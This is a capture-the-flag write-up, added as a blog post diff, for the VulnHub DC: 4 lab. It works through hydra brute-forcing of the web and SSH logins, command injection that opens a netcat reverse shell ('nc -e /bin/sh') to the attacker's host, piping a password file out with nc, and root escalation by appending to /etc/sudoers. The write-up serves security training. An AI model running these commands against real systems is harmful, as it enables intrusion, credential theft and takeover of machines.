@@ -1,0 +1,318 @@
+---
+title: "VulnHub | DC: 4 - Writeup"
+excerpt: Writeup for DC:4 of DC series from VulnHub
+date: 2019-09-12 00:00:00
+categories: [VulnHub]
+---
+
+## Information
+DC: 4 is the fourth installment on the VulnHub series *DC* by [DCAU][DCAU]{:target="_blank"}. Similar to DC: 3, it has 
+a single flag.
+
+DC: 4 aims to make the pentester utilize command injection to establish a reverse shell after gaining access to the 
+admin panel. Afterwards, pentester must exploit the vulnerable system to escalate privileges to `root`.
+
+## Tasks
+- Capture the root flag
+ 
+## Summary
+- Use `nmap` to see the services
+- Use `hydra` to brute-force an admin credentials
+- Use `Burp Suite` to utilize command injection to establish a reverse shell
+- Spawn a proper shell with `python`
+- Use `LinEnum` to gather more information on the system
+- Use `hydra` to brute-force `SSH` credentials
+- Use `tee`'s `GTFOBin` to escalate privileges to `root`
+ 
+## Walkthrough
+### nmap
+To see the services that we'll be dealing with, we'll run a basic `nmap` scan.
+
+```
+$ nmap -sC -sV 192.168.2.104
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey:
+|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
+|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
+|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
+80/tcp open  http    nginx 1.15.10
+|_http-server-header: nginx/1.15.10
+|_http-title: System Tools
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+We can see that two services running; `SSH` on Port 22 and `HTTP` on Port 80.
+
+### HTTP
+Visiting `192.168.2.104` greets us with a login panel.
+
+![Login][Login]
+
+Trying common credentials such as `admin`/`admin` or `admin`/`password` yields no result. As a result, we'll have to 
+brute-force our login.
+
+### Brute-forcing Login To The Panel
+Checking the source code of the login page, we can see how our login credentials are handled.
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+<title>System Tools</title>
+<link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="inner">
+            <h2>Admin Information Systems Login</h2>
+            <form action="login.php" method="post">
+                Username:
+
+                <input type="text" name="username" value=""><p>
+                Password:
+
+                <input type="password" name="password" value=""><p>
+                <input type="submit" value="Submit">
+            </form>
+        </div>
+    </div>
+</body>
+</html>
+```
+
+With this info in mind, we'll use `hydra` to brute-force our login. Since we don't have any ideas on what the username 
+might be, it's a safe bet to use `admin` as a starter. Do note that `rockyou.txt` was copied from 
+`/usr/share/wordlists`.
+
+```
+$ hydra -l admin -P rockyou.txt 192.168.2.104 http-post-form "/login.php:username=^USER^&password=^PASS^:S=logout" -F
+[80][http-post-form] host: 192.168.2.104   login: admin   password: happy
+```
+
+Our username choice was right and `hydra` found a password matching that `admin`; `happy`. Using these credentials in 
+the login panel, we're now greeted with two options; `Command` and `Click to Logout`.
+
+![Admin Panel - 1][Admin Panel - 1]
+
+Clicking `Command`, we are given 3 commands to run.
+
+![Admin Panel - 2][Admin Panel - 2]
+
+Choosing one of the three available commands shows us what command was ran and its terminal output.
+
+![Admin Panel - 3][Admin Panel - 3]
+
+With this in mind, we'll be manipulating the webpage via command injection to establish a reverse shell to access the 
+system.
+
+### Establishing a Reverse Shell via Command Injection
+We'll use `Burp Suite` to utilize the command injection. After setting up the proxy, starting `Burp Suite` and then 
+re-running the `Run Command` function, we can see `/command.php` in `HTTP History`. 
+
+![Burp Suite - 1][Burp Suite - 1]
+
+From here we can throw `/command.php` to the `Repeater` to analyze its parameters.
+
+![Burp Suite - 2][Burp Suite - 2]
+
+From here we can see 3 rows; our cookie, the command that was ran and the string for the button. Changing `ls -l` 
+to `nc -e /bin/sh 192.168.2.112 7500` will allow us to establish a reverse shell as soon as we click `Send`.
+
+![Burp Suite - 3][Burp Suite - 3]
+
+```
+$ nc -lvnp 7500
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+```
+
+### Reverse Shell to SSH
+Since we've established a reverse shell, we'll be spawning a proper shell using `python` and then gather information 
+regarding our system using `LinEnum`.
+
+```
+$ python -c 'import pty; pty.spawn("/bin/sh")'
+
+$ wget raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+$ chmod +x LinEnum.sh
+
+$ ./LinEnum.sh
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+
+[...]
+
+
+[-] Are permissions on /home directories lax:
+total 20K
+drwxr-xr-x  5 root    root    4.0K Apr  7 02:33 .
+drwxr-xr-x 21 root    root    4.0K Apr  5 20:24 ..
+drwxr-xr-x  2 charles charles 4.0K Jul 19 22:29 charles
+drwxr-xr-x  3 jim     jim     4.0K Jul 19 15:49 jim
+drwxr-xr-x  2 sam     sam     4.0K Apr  7 04:31 sam
+
+[...]
+```
+
+`LinEnum` found 3 users in the system; `charles`, `jim`, and `sam`. Taking a look at their home directories show us 
+that `charles` and `sam` don't give us much to work with while `jim` has 2 interesting files; a `.sh` that has a 
+`-rwsrwxrwx` `SUID` and a file named `old-passwords.bak` which is located in a folder named `backups`. By copying 
+`old-passwords.bak` to our system, we can examine it further.
+
+```
+$ ls -la /home/charles
+-rw-r--r-- 1 charles charles  220 Apr  6 20:02 .bash_logout
+-rw-r--r-- 1 charles charles 3526 Apr  6 20:02 .bashrc
+-rw-r--r-- 1 charles charles  675 Apr  6 20:02 .profile
+
+$ ls -la /home/sam
+-rw-r--r-- 1 sam  sam   220 Apr  6 20:03 .bash_logout
+-rw-r--r-- 1 sam  sam  3526 Apr  6 20:03 .bashrc
+-rw-r--r-- 1 sam  sam   675 Apr  6 20:03 .profile
+
+$ ls -la  /home/jim
+-rw-r--r-- 1 jim  jim   220 Apr  6 20:02 .bash_logout
+-rw-r--r-- 1 jim  jim  3526 Apr  6 20:02 .bashrc
+-rw-r--r-- 1 jim  jim   675 Apr  6 20:02 .profile
+drwxr-xr-x 2 jim  jim  4096 Apr  7 02:58 backups
+-rw------- 1 jim  jim   528 Apr  6 20:20 mbox
+-rwsrwxrwx 1 jim  jim   174 Apr  6 20:59 test.sh
+
+$ cat jim/test.sh
+#!/bin/bash
+for i in {1..5}
+do
+ sleep 1
+ echo "Learn bash they said."
+ sleep 1
+ echo "Bash is good they said."
+done
+ echo "But I'd rather bash my head against a brick wall."
+
+$ ls -la /home/jim/backups
+-rw-r--r-- 1 jim jim 2047 Apr  7 02:26 old-passwords.bak
+
+$ nc -lvnp 7750 > old-passwords.bak 
+
+$ cat /homejim/backups/old-passwords.bak | nc 192.168.2.112 7750
+```
+
+Taking a look at `old-passwords.bak` reveals a lot of possible passwords. Taking the `SSH` service running on Port 22 
+to account, we'll brute-force the `SSH` as `jim` using this password list.
+
+```
+$ hydra -l jim -P old-passwords.bak 192.168.2.104 ssh
+[22][ssh] host: 192.168.2.104   login: jim   password: jibril04
+```
+
+`jim`'s `SSH` password is `jibril04`. Now with this info, we can login to `SSH` as `jim`.
+
+### SSH
+After logging into `SSH` as `jim`, we are informed that we have a mail. Reading it shows us that it is from `charles` 
+and that he has sent us his password; `^xHhA&hvim0y`.
+
+```
+$ ssh jim@192.168.2.104
+jim@192.168.2.104's password:
+
+You have mail.
+
+jim@dc-4:~$ echo p | mail
+Mail version 8.1.2 01/15/2001.  Type ? for help.
+"/var/mail/jim": 1 message 1 unread
+>U  1 charles@dc-4       Sat Apr 06 21:15   27/715   Holidays
+Message 1:
+From charles@dc-4 Sat Apr 06 21:15:46 2019
+Envelope-to: jim@dc-4
+Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
+To: jim@dc-4
+Subject: Holidays
+MIME-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+From: Charles <charles@dc-4>
+Date: Sat, 06 Apr 2019 21:15:45 +1000
+
+Hi Jim,
+
+I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.
+
+Password is: ^xHhA&hvim0y
+
+See ya,
+Charles
+
+Saved 1 message in /home/jim/mbox
+```
+
+With `charles`'s password in our hands, we can login as `charles`. After logging in as `charles`, we'll run `sudo -l`; 
+which will display the commands `charles` can run.
+
+```
+jim@dc-4:~$ su charles
+Password:
+
+charles@dc-4:/home/jim$ sudo -l
+Matching Defaults entries for charles on dc-4:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User charles may run the following commands on dc-4:
+    (root) NOPASSWD: /usr/bin/teehee
+```
+
+`charles` can run `teehee` without being a sudoer. Taking a look at [this][GTFOBin]{:target="_blank"} `GTFOBin` we can 
+see how we can exploit `teehee`.
+
+```
+charles@dc-4:~$ echo "charles ALL=(ALL:ALL) ALL" | sudo teehee /etc/sudoers
+charles ALL=(ALL:ALL) ALL
+```
+
+Now, `charles` can switch to `root` without needing to enter a password.
+
+```
+charles@dc-4:~$ sudo su
+
+root@dc-4:/home/charles# cd /root
+
+root@dc-4:~# ls -la
+-rw-------  1 root root   16 Apr  7 04:31 .bash_history
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+drwxr-xr-x  2 root root 4096 Apr  6 20:32 .nano
+-rw-r--r--  1 root root  148 Aug 18  2015 .profile
+-rw-r--r--  1 root root  976 Apr  6 21:27 flag.txt
+
+root@dc-4:~# cat flag.txt
+888       888          888 888      8888888b.                             888 888 888 888
+888   o   888          888 888      888  "Y88b                            888 888 888 888
+888  d8b  888          888 888      888    888                            888 888 888 888
+888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888
+888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888
+88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P
+8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
+888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888
+
+Congratulations!!!
+
+Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and who have taken time to complete these little
+challenges.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+```
+
+Thus, we’ve gained captured the root flag in DC: 4.
+
+[DCAU]:                 https://twitter.com/DCAU7
+[Login]:                /images/2019-09-12-vulnhub-dc_4/Login.png
+[Admin Panel - 1]:      /images/2019-09-12-vulnhub-dc_4/Admin%20Panel%20-%201.png
+[Admin Panel - 2]:      /images/2019-09-12-vulnhub-dc_4/Admin%20Panel%20-%202.png
+[Admin Panel - 3]:      /images/2019-09-12-vulnhub-dc_4/Admin%20Panel%20-%203.png
+[Burp Suite - 1]:       /images/2019-09-12-vulnhub-dc_4/Burp%20Suite%20-%201.png
+[Burp Suite - 2]:       /images/2019-09-12-vulnhub-dc_4/Burp%20Suite%20-%202.png
+[Burp Suite - 3]:       /images/2019-09-12-vulnhub-dc_4/Burp%20Suite%20-%203.png
+[GTFOBin]:              https://gtfobins.github.io/gtfobins/tee/#sudo
